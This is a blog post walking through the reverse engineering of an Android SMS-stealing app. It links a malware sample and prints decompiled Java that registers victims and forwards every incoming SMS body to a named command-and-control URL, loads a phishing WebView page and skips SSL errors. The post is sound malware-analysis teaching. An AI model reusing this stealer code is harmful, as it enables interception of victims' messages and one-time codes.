---
title: Taking Apart an Android SMS Stealer
date: 2024-02-05 08:05:00 +0800
categories: [android, malware]
tags: [malware]
---

# Intro
Hi everyone! Today we're going to analyze our first malware for Android! Android reversing presents with it a set of new challenges, and we will learn about the Android OS and Android Development. For this post, a knowledge of Java (Although not a lot) is recommended because like most of Android, the app we'll be reversing is written in Java. If you don't have Java knowledge I recommend you try reading the post and stop if you can't understand it. You can find the malware [here](https://bazaar.abuse.ch/download/355cd2b71db971dfb0fac1fc391eb4079e2b090025ca2cdc83d4a22a0ed8f082/)
# A Brief Overview of Android
Before we start reversing the malware, let's learn a bit about Android.
Google started developing Android in 2005, with the goal of developing a new OS for mobile devices. Android is a fork of Linux, and it's open source, so you can read its code [here](https://source.android.com/docs/setup/download/downloading). It is written mostly in Java, with some native components written in C and C++. The implementation of Java that Android uses is called Dalvik. Dalvik is a bytecode format like the regular Java bytecode, and it is run on the DVM (Dalvik Virtual Machine). The main difference between regular Java bytecode and Dalvik bytecode is that Dalvik bytecode is register-based while Java bytecode is stack-based. Android applications are packaged as an **APK** (Application Package Kits), and are similar to JARs. But there's a problem: How can Android applications start up so fast when they need to initalize the DVM? This is made possible thanks to Android's process model, which uses something called the **zygote** process. The following diagram describes the Android process model:
![process-diag](/assets/img/smsstealer/process_diag.png)
_Android Process Diagram_
For reading more about Android, I recommend the book "Android Internals" by Jonathan Levin. Now that we understand how Android works a bit more, we can start reversing.
# Starting Out
We start with the APK of the app. Since APKs are a zipped archive, we can extract the files by unzipping the APK with a tool such as 7zip (usually I do this with [apktool](https://github.com/iBotPeaches/Apktool), but this APK was packaged with a different version of zip that apktool didn't handle well). The APK contains the following files:
![directory-listing](/assets/img/smsstealer/directory_listing.png)
_The files inside of the APK_
Let's go through them one by one:
- `AndroidManifest.xml` is the manifest for the package. It contains metadata about the package such as the permissions requested by the application (which the user can approve or deny) and the activities defined by the application.
- `classes.dex` is the app's compiled Dalvik bytecode. To reverse engineer the app, we'll convert it into a `jar` and decompile it.
- `META-INF` contains metadata about the `jar`. It isn't very interesting to us.
- `okhttp3` is the directory for a library called `okhttp3` that is related to, well, HTTP.
- `res` contains non-code resources such as the strings and screen layouts used.
- `resources.arsc` is a binary file that contains resources that the application uses
The manifest is stored in binary XML which isn't comfortable to look at, so we'll decode it (I'm using Android studio).
![manifest-a](/assets/img/smsstealer/manifest1.png)
_a_
![manifest-b](/assets/img/smsstealer/manifest2.png)
_b_
![manifest-c](/assets/img/smsstealer/manifest3.png)
_c_
The following things are important to notice here:
- The app requests the following permissions: `INTERNET, ACCESS_NETWORK_STATE, RECEIVE_SMS, READ_SMS`, so that it will be able to access the internet and control SMSes.
- The package name is `realrat.siqe.holo`, quite a suspicious name :)
- The app defines a **receiver** for receiving SMSes called `MyReceiver`, so that it will be able to control what happens every time the phone gets an SMS.
- The activities `ir.siqe.holo.MainActivity2` and `ir.siqe.holo.MainActivity` are defined. An activity is essentially a part of an app that also has a layout. For instance, a social media app can have an activity for looking at the profile of user, and an activity for viewing posts.
This is quite interesting! As you can see, manifests often reveal a ton of info about an APK.
To start reversing the code, we convert `classes.dex`  (Dalvik Bytecode) into a jar with a handy tool called [dex2jar](https://github.com/pxb1988/dex2jar). After you have the `jar`, decompile it with a tool such as [jadx](https://github.com/skylot/jadx).
The first activity to get executed is always `MainActivity` (We also saw it in the manifest), so let's start there:

```java
package ir.siqe.holo;  
 
import android.content.Intent;  
import android.content.SharedPreferences;  
import android.os.Bundle;  
import android.view.View;  
import android.widget.EditText;  
import android.widget.Toast;  
import androidx.appcompat.app.AppCompatActivity;  
import androidx.core.app.ActivityCompat;  
 
public class MainActivity extends AppCompatActivity {  
    public void onCreate(Bundle bundle) {  
        super.onCreate(bundle);  
        setContentView(R.layout.activity_main);  
        SharedPreferences.Editor edit = getSharedPreferences("info", 0).edit();  
        findViewById(R.id.go).setOnClickListener(new View.OnClickListener(this, (EditText) findViewById(R.id.idetify_phone), edit) {
            final MainActivity this$0;  
            final EditText val$editText;  
            final SharedPreferences.Editor val$editor;  
 
            {  
                this.this$0 = this;  
                this.val$editText = r5;  
                this.val$editor = edit;  
            }  
   
            public void onClick(View view) {  
                if (!this.val$editText.getText().toString().matches("(\\+98|0)?9\\d{9}")) {  
                    Toast.makeText(this.this$0, "شماره موبایل معتبر نیست", 0).show();  
                    return;  
                }  
                ActivityCompat.requestPermissions(this.this$0, new String[]{"android.permission.RECEIVE_SMS"}, 0);  
                if (Integer.valueOf(ActivityCompat.checkSelfPermission(this.this$0, "android.permission.RECEIVE_SMS")).intValue() == 0) {  
                    this.val$editor.putString("phone", this.val$editText.getText().toString());  
                    this.val$editor.commit();  
                    new connect(this.val$editText.getText().toString(), "تارگت جدید نصب کرد", this.this$0);  
                    this.this$0.startActivity(new Intent(this.this$0, MainActivity2.class));  
                }  
            }  
        });  
    }  
}
```

We can see that the first function here is `onCreate`. Every activity has an `onCreate` function that is the first to get called when the activity is started. After calling the `onCreate` function of its parent, it sets the current layout. A layout is simply an XML that defines what to display on the user's screen. In this case, it sets the layout to a layout called `activity_main`. Let's look at its XML (It is located in the `res` folder we've seen earlier; also the XML is stored in binary XML so you need to decode it first with a tool such as [axmldec](https://github.com/ytsutano/axmldec)):

```xml
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:background="type28/4294967295" android:layout_width="4294967295" android:layout_height="4294967295">
  <TextView android:textColor="type28/4278190080" android:textColorHint="type28/4278190080" android:gravity="0x11" android:layout_width="4294967295" android:layout_height="4294967294" android:hint="Singup for Dns +ir " android:backgroundTint="type28/4278190080"/>
  <LinearLayout android:orientation="1" android:layout_width="4294967295" android:layout_height="4294967294" android:layout_margin="20dip" android:layout_centerInParent="true">
    <EditText android:textColor="type28/4278190080" android:textColorHint="type28/4278190080" android:id="type1/2131165319" android:layout_width="4294967295" android:layout_height="4294967294" android:hint="شماره موبایل خود را وارد نمایید" android:inputType="0x2" android:backgroundTint="type28/4278190080"/>
    <Button android:textSize="18dip" android:textColor="type28/4278190080" android:id="type1/2131165307" android:background="type1/2131099743" android:layout_width="4294967295" android:layout_height="4294967294" android:layout_marginTop="10dip" android:text="ورود "/>
  </LinearLayout>
</RelativeLayout>
```

The layout contains the following components:
- A `TextView` (regular text) that contains the string `Singup for Dns +ir`.
- An `EditText` (Textbox for input) that says `شماره موبایل خود را وارد نمایید` ("Enter your phone number")
- A button that says `ورود` ("log in")
Afterwards, the listener of the button is set to a function called `onClick`. This function performs the following:
1. Verify that the text in the input box matches the regex `(\\+98|0)?9\\d{9}`. I think this regex is supposed to match a phone number, but it is bugged and matches the string `9\ddddddddd` for example. If there isn't a regex match, a toast is started with an error message.
2. Request the `RECEIVE_SMS` permission. If the permission is granted, the phone number is stored inside the shared preferences (A storage for the app) with the `phone` key, and the `connect` function is called with the arguments: 1. THE PHONE NUMBER and 2. "تارگت جدید نصب کرد" (Installed new target).Finally, the `MainActivity2` activity is started.
Let's start with `connect` and then move on to `MainActivity2`. Here's the decompilation:

```java
package ir.siqe.holo;  
 
import android.content.Context;  
import android.content.SharedPreferences;  
import android.util.Log;  
import com.androidnetworking.AndroidNetworking;  
import com.androidnetworking.error.ANError;  
import com.androidnetworking.interfaces.JSONArrayRequestListener;  
import org.json.JSONArray;  
 
public class connect {  
    Context context;  
    SharedPreferences preferences;  
    String url;  
 
    public connect(String str, String str2, Context context) {  
        this.url = str;  
        this.context = context;  
        AndroidNetworking.initialize(context);  
        AndroidNetworking.get("https://eblaqie.org/ratsms.php?phone=" + str + "&info=" + str2).build().getAsJSONArray(new JSONArrayRequestListener(this, str, str2) {
            final connect this$0;  
            final String val$info;  
            final String val$url;  
 
            {  
                this.this$0 = this;  
                this.val$url = str;  
                this.val$info = str2;  
            }  
   
            public void onError(ANError aNError) {  
                Log.i("==================", "erroeererewrwerwer");  
                AndroidNetworking.get("https://google.com" + this.val$url + "&info=" + this.val$info).build().getAsJSONArray(new JSONArrayRequestListener(this) {
                    final AnonymousClass1 this$1;  
 
                    {  
                        this.this$1 = this;  
                    }  
 
                    public void onError(ANError aNError2) {  
                        Log.i("==================", "erroeererewrwerwer");  
                    }  
 
                    public void onResponse(JSONArray jSONArray) {  
                    }  
                });  
            }  
 
            public void onResponse(JSONArray jSONArray) {  
            }  
        });  
    }  
}
```

This function is very simple. It sends a request to `"https://eblaqie.org/ratsms.php?phone=" + arg1 + "&info=" + arg2` (For instance in the call we've seen in main it would contact `https://eblaqie.org/ratsms.php?phone=THE_PHONE_NUMBER_IN_THE_EDITTEXT&info=شماره موبایل خود را وارد نمایید` to signify that the malware got a new target) and the performs some error checking. Unfortunately, `eblaqie.org` is down now (I've also checked on WaybackMachine) so we can't test this further, but Virustotal shows that the site is malicious:
![virustotal-anal](/assets/img/smsstealer/virustotal_of_c2.png)
_The VirusTotal Analysis_
Now let's analyze `MainActivity2`:

```java
package ir.siqe.holo;  
 
import android.graphics.Bitmap;  
import android.net.http.SslError;  
import android.os.Bundle;  
import android.util.Log;  
import android.webkit.SslErrorHandler;  
import android.webkit.WebResourceError;  
import android.webkit.WebResourceRequest;  
import android.webkit.WebView;  
import android.webkit.WebViewClient;  
import android.widget.Toast;  
import androidx.appcompat.app.AppCompatActivity;  
   
public class MainActivity2 extends AppCompatActivity {  
 
    private class mWebViewClient extends WebViewClient {  
        final MainActivity2 this$0;  
 
        private mWebViewClient(MainActivity2 mainActivity2) {  
            this.this$0 = mainActivity2;  
        }  
   
        public void onPageFinished(WebView webView, String str) {  
            super.onPageFinished(webView, str);  
        }  
   
        public void onPageStarted(WebView webView, String str, Bitmap bitmap) {  
            super.onPageStarted(webView, str, bitmap);  
        }  
 
        public void onReceivedError(WebView webView, WebResourceRequest webResourceRequest, WebResourceError webResourceError) {  
            super.onReceivedError(webView, webResourceRequest, webResourceError);  
            Log.i("============>", webResourceError + com.androidnetworking.BuildConfig.FLAVOR);  
        }  
   
        public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {  
            super.onReceivedSslError(webView, sslErrorHandler, sslError);  
            Log.i("============s>", sslError + com.androidnetworking.BuildConfig.FLAVOR);  
            sslErrorHandler.proceed();  
        }  
 
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {  
            webView.loadUrl(str);  
            return true;  
        }  
    }  
   
    public void onBackPressed() {  
        Toast.makeText(this, "back to exit", 1).show();  
    }  
 
    public void onCreate(Bundle bundle) {  
        super.onCreate(bundle);  
        setContentView(R.layout.web);  
        WebView webView = (WebView) findViewById(R.id.webview);  
        webView.getSettings().setJavaScriptEnabled(true);  
        webView.setWebViewClient(new mWebViewClient());  
        webView.getSettings().setDomStorageEnabled(true);  
        webView.getSettings().setLoadWithOverviewMode(true);  
        webView.getSettings().setUseWideViewPort(true);  
        webView.loadUrl("https://eblaqie.org/pishgiri");  
    }  
}
```

Again, we start with `onCreate`. It sets the layout to a layout called `web`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="4294967295" android:layout_height="4294967295">
  <WebView android:id="type1/2131165433" android:layout_width="4294967295" android:layout_height="4294967295"/>
</RelativeLayout>
```

This layout only contains a WebView. A WebView allows to display content from the internet inside a layout. After setting the layout, the `onCreate` function loads the URL `https://eblaqie.org/pishgiri`. It would have been interesting to see what's on there, but again because the C2 is down we can't see it.
Our final component to analyze is the SMS receiver (`MyReceiver`):

```java
package ir.siqe.holo;  
 
import android.content.BroadcastReceiver;  
import android.content.Context;  
import android.content.Intent;  
import android.content.SharedPreferences;  
import android.os.Bundle;  
import android.telephony.SmsMessage;  
   
public class MyReceiver extends BroadcastReceiver {  
    public void onReceive(Context context, Intent intent) {  
        int i = 0;  
        SharedPreferences sharedPreferences = context.getSharedPreferences("info", 0);  
        SharedPreferences.Editor edit = sharedPreferences.edit();  
        Bundle extras = intent.getExtras();  
        String str = com.androidnetworking.BuildConfig.FLAVOR;  
        String str2 = str;  
        if (extras != null) {  
            Object[] objArr = (Object[]) extras.get("pdus");  
            int length = objArr.length;  
            SmsMessage[] smsMessageArr = new SmsMessage[length];  
            while (true) {  
                str2 = str;  
                if (i >= length) {  
                    break;  
                }  
                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);  
                str = ((str + "\r\n") + smsMessageArr[i].getMessageBody().toString()) + "\r\n";  
                i++;  
            }  
        }  
        if (str2.contains("سایت شب")) {  
            edit.putString("lock", "off");  
            edit.commit();  
        }  
        String str3 = str2;  
        if (str2.contains("\n")) {  
            str3 = str2.replaceAll("\n", " ");  
        }  
        new connect(sharedPreferences.getString("phone", "0"), str3, context);  
    }  
}
```

The only function defined here is `onReceive`. It gets called every time an SMS message is received, with an intent describing the message. The details of the message are passed inside the extras of the intent. If the extras are not null, the following things are performed:
1. The PDUs of the SMS message are put inside an array
2. A new array `smsMessageArr` of SMS messages is constructed from the PDUs
3. The message body of each SMS message is concatanated to `str`, along with a CRLF (`\r\n`)
The PDU (Protocol Descripition Unit) contains the body of the SMS, alongside some metadata like the sender and the timestamp. Here it is used to retreieve the body of the SMS. For reading more PDUs, I recommend [this](https://www.gsmfavorites.com/documents/sms/pdutext/) page.
Finally, the bodies of all the SMSes are sent to the C2 using the `connect` function that we already analyzed.
Thanks for reading❤️
Until next time :)
Yoray
